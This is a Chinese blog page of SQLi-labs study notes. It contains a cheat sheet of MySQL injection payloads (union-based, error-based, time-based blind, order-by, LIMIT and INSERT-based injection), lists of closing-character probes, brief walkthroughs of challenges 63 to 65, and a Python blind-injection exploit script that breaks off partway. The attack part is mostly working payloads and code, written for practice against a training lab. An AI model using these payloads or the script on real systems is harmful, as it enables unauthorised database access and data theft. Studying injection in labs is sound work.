<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Unc1e的博客">
<meta property="og:url" content="http://unc1e.com/page/15/index.html">
<meta property="og:site_name" content="Unc1e的博客">
<meta property="article:author" content="Unc1e">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://unc1e.com/page/15/"/>





  <title>Unc1e的博客</title>
  








<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Unc1e的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/05/yuque/SQLi-lab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/05/yuque/SQLi-lab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url">SQLi-lab学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-05T15:22:32+08:00">
                2020-04-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>bypass<br><a href="https://xz.aliyun.com/t/7767" target="_blank" rel="noopener">https://xz.aliyun.com/t/7767</a></p>
</blockquote>
<h1 id="常用-payload"><a href="#常用-payload" class="headerlink" title="常用 payload"></a>常用 payload</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586599797233-1453d801-5d9a-479c-876c-12f33e0854ab.png#align=left&display=inline&height=705&margin=%5Bobject%20Object%5D&name=mysql-infomation.schema.png&originHeight=705&originWidth=898&size=53643&status=done&style=none&width=898" alt="mysql-infomation.schema.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586403342343-7b65273a-1679-4d86-ae09-ff008cdeece7.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=572&size=35317&status=done&style=none&width=572" alt="image.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 测试！</span></span><br><span class="line"></span><br><span class="line">LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>

<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># UNION BASED</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 列出所有数据库</span></span><br><span class="line"></span><br><span class="line">union select group<span class="emphasis">_concat(SCHEMA_</span>NAME) from information_schema.SCHEMATA</span><br><span class="line"></span><br><span class="line"><span class="section"># 列出数据库 test 中的所有表(均可用 16 进制)</span></span><br><span class="line"></span><br><span class="line">union select group<span class="emphasis">_concat(TABLE_</span>name) from information<span class="emphasis">_schema.tables where table_</span>schema=<span class="code">`test`</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 列出（数据库：test 表：admin ）中所有的字段</span></span><br><span class="line"></span><br><span class="line">union select group<span class="emphasis">_concat(COLUMN_</span>NAME) from information_schema.COLUMNS where</span><br><span class="line">TABLE<span class="emphasis">_SCHEMA=`test` and TABLE_</span>NAME=<span class="code">`admin`</span></span><br><span class="line"></span><br><span class="line">UNION SELECT 1,2,group<span class="emphasis">_concat( column_</span>name,0x20)) from information_schema.columns</span><br><span class="line"></span><br><span class="line"><span class="section"># valid queries</span></span><br><span class="line"></span><br><span class="line">id=1' AND 1=2 union select 1,2,(select group<span class="emphasis">_concat() from information_</span>schema.schemata) -- +</span><br><span class="line">id=1' AND 1=2 union select 1,2,(select group<span class="emphasis">_concat() from information_</span>schema.tables where table_schema='security')-- #</span><br><span class="line">id=1' AND 1=2 union select 1,2,(select group<span class="emphasis">_concat() from information_</span>schema.columns where table_name='users') -- +</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注意：group_concat 可以不跟 group by，但里面必须跟列名，而不能跟子查询</span><br><span class="line"><span class="bullet">- </span>回显常常有长度限制</span><br><span class="line"></span><br><span class="line"><span class="section"># ERROR BASED 报错注</span></span><br><span class="line"></span><br><span class="line">updatexml('2',concat('~',(select current_user()),'~'),'2')-- -</span><br><span class="line">extractvalue(1, concat(0x5c, (select table<span class="emphasis">_name from information_</span>schema.tables limit 1),'~'));-- -</span><br><span class="line">select from(select count(<span class="emphasis">*),concat(version(),floor(rand(0)*</span>2))x from information_schema.tables group by x )x-- -</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>concat 可用 concat<span class="emphasis">_ws 替代，也可用 group_</span>concat 整合结果</span><br><span class="line"></span><br><span class="line"><span class="section"># BLIND SQL injection 盲注，延时注</span></span><br><span class="line"></span><br><span class="line">id = 1" and sleep(0)='1' -- -</span><br><span class="line">id=1" and if(1=1, sleep(3) , 1 ) -- -</span><br><span class="line">id=1 and 1=(case when (2=2) then sleep(5) else 1 end) -- #</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>盲注似乎只能用是否延时，来确定是否闭合</span><br><span class="line"><span class="bullet">- </span>case when 后面的语句需要加括号，否则不能成功</span><br><span class="line"></span><br><span class="line"><span class="section"># 基本信息</span></span><br><span class="line"></span><br><span class="line"><span class="code">    	select @@basedir</span></span><br><span class="line"><span class="code">    	select @@datadir</span></span><br><span class="line"><span class="code">    	select current_user()</span></span><br><span class="line"></span><br><span class="line"><span class="code">    	select version()</span></span><br><span class="line"><span class="code">    	select @@version</span></span><br><span class="line"><span class="code">    	select database()</span></span><br><span class="line"><span class="code">    	select @@database</span></span><br><span class="line"></span><br><span class="line"><span class="section"># POC</span></span><br><span class="line"></span><br><span class="line">extractvalue(0X20, concat(0x5c, (VERSION（)),'~'));-- -</span><br></pre></td></tr></table></figure>

<ul>
<li>报错注入，需要语法无错误才可，<strong>该闭合的地方要闭合</strong>，如注释符（<code>-- -</code>）</li>
<li>得出结论，一般可以用盲注的地方也可以用<code>outfile|dumpfile|load_file</code>.</li>
<li>盲注可分为两类：布尔盲注+基于时间的盲注。</li>
</ul>
<p>因为没有 T/F 的回显，即从响应上看不出任何差异（响应包括：响应大小/状态码/页内文字），只好采用延时函数, 一般来说，延时函数可以用<code>sleep</code>  <code>benchmark</code>，不过下面的文章提到了一种新的延时方式。</p>
<blockquote>
<p><a href="https://www.cnblogs.com/-qing-/p/10894310.html" target="_blank" rel="noopener">MySQL 时间盲注五种延时方法 (PWNHUB 非预期解)</a></p>
</blockquote>
<h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><p><a href="https://github.com/hi-unc1e/some_scripts" target="_blank" rel="noopener">https://github.com/hi-unc1e/some_scripts</a></p>
<h2 id="Handler-注入"><a href="#Handler-注入" class="headerlink" title="Handler 注入"></a>Handler 注入</h2><p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/hello-there/p/12882991.html" target="_blank" rel="noopener">https://www.cnblogs.com/hello-there/p/12882991.html</a></li>
</ul>
<p>无列名注入（ban 逗号）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3 <span class="xml"><span class="tag">&lt;<span class="name">=</span>&gt;</span></span></span><br><span class="line">union select \* from (select 1)a join (select 2)b join (select 3)c</span><br><span class="line"></span><br><span class="line">limit 2,1 <span class="xml"><span class="tag">&lt;<span class="name">=</span>&gt;</span></span>limit 1 offset 2</span><br></pre></td></tr></table></figure>

<h2 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h2><blockquote>
<p>order by 的注入点，SQL 预编译会解决 sql 注入问题，但是有些地方是不能参数化的。比如 order by 后就不能参数化，挖注入的时候看准 orderby、sort 参数，一挖一个准。<br>为什么 orderby 不能参数化查询？<a href="https://www.cnblogs.com/lsdb/p/12084038.html" target="_blank" rel="noopener">移步这里</a></p>
</blockquote>
<blockquote>
<p>是字符串又不能加引号（否则查询会出错）<br>预编译（参数化）会自动加引号</p>
</blockquote>
<blockquote>
<p>无法预编译 =&gt; 导致注入</p>
</blockquote>
<p>order by 语句后面发生的注入，特点如下</p>
<ul>
<li>无法作运算，即<code>sort=2</code>与<code>sort=(3-1)</code>并不相同</li>
<li>如果直接<code>if(1=2,1,SLEEP(2))</code>，sleep 时间将会变成 2*当前表中记录的数目，<strong>将会对服务器造成一定的拒绝服务攻击，</strong>建议采用子语句验证延时注入，例如<code>if(1=2,1,(select 1 from (select SLEEP(2))x))</code></li>
</ul>
<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html" target="_blank" rel="noopener">Mysql-Order-By-Injection-Summary</a></li>
<li><a href="https://xz.aliyun.com/t/7919" target="_blank" rel="noopener">渗透经验分享之 SQL 注入思路拓展 - 先知社区</a></li>
</ul>
<h2 id="LIMIT-后的注入"><a href="#LIMIT-后的注入" class="headerlink" title="**LIMIT 后的注入"></a>**LIMIT 后的注入</h2><p>报错注，payload 如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x7c,version())),rand());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysql&gt; select `table_name` from information_schema.tables limit 0,1 procedure analyse(extractvalue(rand(), concat(0x7c, version(),0x7c)),rand());</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: '|5.5.44-0ubuntu0.14.04.1|'</span><br></pre></td></tr></table></figure>

<p>如果不能报错的华，可以用延时注，但是貌似不能用 sleep()，会报错<code>ERROR 1105 (HY000): Only constant XPATH queries are supported</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br><span class="line">// 虽然会报错，但是的确有延时</span><br><span class="line"><span class="number">1</span>‘ <span class="keyword">case</span> 为真，有延迟，延迟后报错</span><br><span class="line"><span class="number">2</span>‘ <span class="keyword">case</span> 为假，马上报错</span><br></pre></td></tr></table></figure>

<p>ref</p>
<ul>
<li><a href="https://www.cnblogs.com/qing123/p/4575901.html" target="_blank" rel="noopener">https://www.cnblogs.com/qing123/p/4575901.html</a></li>
<li><a href="https://xz.aliyun.com/t/5858" target="_blank" rel="noopener">https://xz.aliyun.com/t/5858</a></li>
</ul>
<h2 id="不插入数据的注入（INSERT-UPDATE-注入）"><a href="#不插入数据的注入（INSERT-UPDATE-注入）" class="headerlink" title="不插入数据的注入（INSERT / UPDATE 注入）"></a>不插入数据的注入（INSERT / UPDATE 注入）</h2><p>在网鼎杯中考察了一种另类的注入方式，insert 语句中在不插入数据的情况下，完成注入，使用到了 pow(999,999)报错。<br>首先，我们看看下面的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># （1=1）为真，查询出错。即(QUERY)为真时，查询会出错。</span></span><br><span class="line">mysql&gt; select `table_name` from information_schema.tables where （1=1） and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'pow(999,999)'</span><br><span class="line"></span><br><span class="line"><span class="comment"># （1=0）为假，查询结果为空。即(QUERY)为假时，查询结果为空。</span></span><br><span class="line">mysql&gt; select `table_name` from information_schema.tables where （1=0） and pow(999,999);</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>报错 =&gt; 查询为真</li>
<li>结果为空 =&gt; 查询为假</li>
</ul>
<p>既然已经明确了 True/False 时的响应情况，你马上就可以意识到这实际就是个布尔盲注，就可以在不向数据库中插入数据的情况下，完成数据的猜解。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592584010906-15ef6e01-2828-4435-98d9-e994ea291895.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=exp999.png&originHeight=324&originWidth=1903&size=85797&status=done&style=none&width=1903" alt="exp999.png"><br><strong>成因分析</strong>（以下纯属个人理解）<br>因为<code>（QUERY）and pow(999,999)</code>是双目运算符，必须要两边都为真时才为真，一碰到假<strong>马上就</strong>会返回假，不会再进行后续的计算；也就是说，在这里<code>and</code>运行时会有三种状态，真(True)、假(False)、错误(Error)，我们就是利用的它后两种状态的区别，来实现盲注。<br><strong>总结</strong><br>1）. 当查询语句<code>QUERY</code>为假时，mysql 不会对后面的<code>pow(999,999)</code>进行计算，直接就返回<code>false</code>;<br>2）. 当查询语句<code>QUERY</code>为真时，mysql 会对后面的<code>pow(999,999)</code>进行计算，由于这个数太大已经溢出，当然就会报错。<br><strong>闭合符号</strong></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 闭合符号</span></span><br><span class="line"></span><br><span class="line">0|()--</span><br><span class="line">0'|()--</span><br><span class="line">0"|()--</span><br><span class="line">0)|()--</span><br><span class="line">0')|()--</span><br><span class="line">0")|()--</span><br><span class="line">0))|()--</span><br><span class="line">0'))|()--</span><br><span class="line">0"))|()--</span><br><span class="line">0)))|()--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 当单引号被过滤(去掉)</span></span><br><span class="line"></span><br><span class="line">0%df'|()--</span><br><span class="line">0%df')|()--</span><br><span class="line">0%df'))|()--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 当双引号被过滤</span></span><br><span class="line"></span><br><span class="line">0%df"|()--</span><br><span class="line">0%df")|()--</span><br><span class="line">0%df"))|()--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line">0'|()|''='1--</span><br><span class="line">0"|()|''='1--</span><br><span class="line">0)|()|''='1--</span><br><span class="line">0')|()|''='1--</span><br><span class="line">0")|()|''='1--</span><br><span class="line">0))|()|''='1--</span><br><span class="line">0'))|()|''='1--</span><br><span class="line">0"))|()|''='1--</span><br><span class="line">0)))|()|''='1--</span><br><span class="line"><span class="section">#####################################</span></span><br><span class="line">0'||()||''='1</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Less-65-Challenge-12"><a href="#Less-65-Challenge-12" class="headerlink" title="Less-65:Challenge-12"></a>Less-65:Challenge-12</h1><p>闭合符号是<code>&quot;)</code>，改 exp，冲！<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594118424392-b412f696-0ba2-4e37-be09-fd9a140da722.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=363&originWidth=529&size=11847&status=done&style=none&width=264.5" alt="图片.png"></p>
<h1 id="Less-64-Challenge-11"><a href="#Less-64-Challenge-11" class="headerlink" title="Less-64:Challenge-11"></a>Less-64:Challenge-11</h1><p>闭合符号是<code>))</code>, 同前面两关<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594112721743-b49f3017-41f2-41ba-a551-1bfd11a8270d.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=292&originWidth=364&size=9313&status=done&style=none&width=182" alt="图片.png"></p>
<h1 id="Less-63-Challenge-10"><a href="#Less-63-Challenge-10" class="headerlink" title="Less-63:Challenge-10"></a>Less-63:Challenge-10</h1><p>闭合符号是单引号<code>&#39;</code><br>把脚本内容中的闭合符号改一改即可，美滋滋</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># less43-exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="section"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="section"># author:unc1e</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"><span class="section"># mysql&gt; select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));</span></span><br><span class="line"></span><br><span class="line"><span class="section"># +------------+------------------------------------+------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="section"># | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |</span></span><br><span class="line"></span><br><span class="line"><span class="section"># +------------+------------------------------------+------------------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="section"># | 49 | 4 | 9 |</span></span><br><span class="line"></span><br><span class="line"><span class="section"># +------------+------------------------------------+------------------------------------+</span></span><br><span class="line"></span><br><span class="line">def str<span class="emphasis">_to_</span>hex(s):</span><br><span class="line">'''</span><br><span class="line">:param s:</span><br><span class="line">:return: 将字符串转为 0x 带头的十六进制值</span><br><span class="line">'''</span><br><span class="line">return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])</span><br><span class="line"></span><br><span class="line"><span class="section"># initialize param</span></span><br><span class="line"></span><br><span class="line">url = "https://sec4ever.cn/Less-63/index.php?id=0' "</span><br><span class="line">reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id=&#123;&#125;".format(url.split("sec4ever.cn")[1]) # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php</span><br><span class="line"></span><br><span class="line">TIMEOUT = 8</span><br><span class="line">VERIFY = True</span><br><span class="line"></span><br><span class="line">table<span class="emphasis">_name_</span>len = len('UX9CUK2CIC')</span><br><span class="line">flag_len = len('uwpeCvsrLcadsa8P7wSn9Ix4')</span><br><span class="line"></span><br><span class="line">charIndexSet = ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"] # 字符串特征,index is from 0-9</span><br><span class="line">charIndexSet_rev = charIndexSet[::-1]</span><br><span class="line">Set = [ -3, -2, -1 ] # 取字符串 ascii 值的百位+十位+个位</span><br><span class="line"></span><br><span class="line"><span class="section"># 个位：substring((query),-1, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 十位：substring((query),-2, 1)；</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 百位 substring((query),-3, 1),</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 初始化</span></span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line">def req2getOneChar(xurl, payload, start, end):</span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line"><span class="code">    :param xurl: base url</span></span><br><span class="line"><span class="code">    :param payload: (select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)</span></span><br><span class="line"><span class="code">    :param start ,end: [start, end]</span></span><br><span class="line"><span class="code">    :return:</span></span><br><span class="line"><span class="code">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="code">    asciiValue = ['0','0','0'] # 百位，十位，个位</span></span><br><span class="line"><span class="code">    flag = ""</span></span><br><span class="line"><span class="code">    for l in range(start, end+1):</span></span><br><span class="line"><span class="code">        for k, kv in enumerate(Set):# 先获取</span></span><br><span class="line"><span class="code">            # k = 0，1，2</span></span><br><span class="line"><span class="code">            # kv = -3，-2，-1 用于substring得到ascii值的各个位上的数字</span></span><br><span class="line"><span class="code">            url = xurl + "or id=" + "substring(ascii(substring((&#123;payload&#125;), &#123;l&#125;, 1)), &#123;kv&#125;, 1)".format(payload=payload, l=l, kv=kv ) + '-- -'</span></span><br><span class="line"><span class="code">            #print(url)</span></span><br><span class="line"><span class="code">            resp = sess.get(url=url, timeout=TIMEOUT, verify=VERIFY)</span></span><br><span class="line"><span class="code">            for i in range(1, 10):# 遍历1~9的特征值for(1,10)</span></span><br><span class="line"><span class="code">                s1 = 'Your Login name : ' + charIndexSet[i]# "Dumb"</span></span><br><span class="line"><span class="code">                e1 = 'Your Password : ' + charIndexSet_rev[i]#admin4</span></span><br><span class="line"><span class="code">                if( resp.text.count(s1) &gt; 0  and resp.text.count(e1) &gt; 0):</span></span><br><span class="line"><span class="code">                    # 若页面内容中含有当前特征值，则认为当前特征值的索引是其对应位的值（0～9）</span></span><br><span class="line"><span class="code">                    # 如：页面同时含有Angelina和dhakkan，该位值为1</span></span><br><span class="line"><span class="code">                    asciiValue[k] = str(i) # 0是个位，1是百位和十位</span></span><br><span class="line"><span class="code">                    break</span></span><br><span class="line"><span class="code">                else:</span></span><br><span class="line"><span 